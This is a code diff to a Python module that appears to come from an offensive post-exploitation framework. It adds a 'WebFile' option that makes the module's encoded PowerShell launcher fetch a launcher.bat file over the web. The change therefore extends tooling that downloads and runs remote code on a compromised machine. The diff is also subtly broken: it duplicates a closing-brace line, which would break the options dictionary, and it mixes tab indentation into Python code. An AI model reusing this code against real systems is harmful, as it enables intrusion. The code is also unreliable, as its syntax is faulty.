@@ -65,6 +65,12 @@ class Module:
                 'Description'   :   'Switch. Cleanup the trigger and any script from specified location.',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            },
+            'WebFile' : {
+                'Description'   :   'The location of the launcher.bat file to fetch over the network/web',
+                'Required'      :   True,
+                'Value'         :   'http://127.0.0.1/launcher.bat'
             }
 #            'UserAgent' : {
 #                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -106,7 +112,7 @@ class Module:
         # management options
         extFile = self.options['ExtFile']['Value']
         cleanup = self.options['Cleanup']['Value']
-
+	webFile = self.options['WebFile']['Value']
         # staging options
 #        userAgent = self.options['UserAgent']['Value']
 #        proxy = self.options['Proxy']['Value']
@@ -142,7 +148,7 @@ class Module:
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher_fetcher(encode=True)
+            launcher = self.mainMenu.stagers.generate_launcher_fetcher(encode=True, webFile=webFile)
             
             encScript = launcher.split(" ")[-1]
             statusMsg += "using launcher_fetcher"
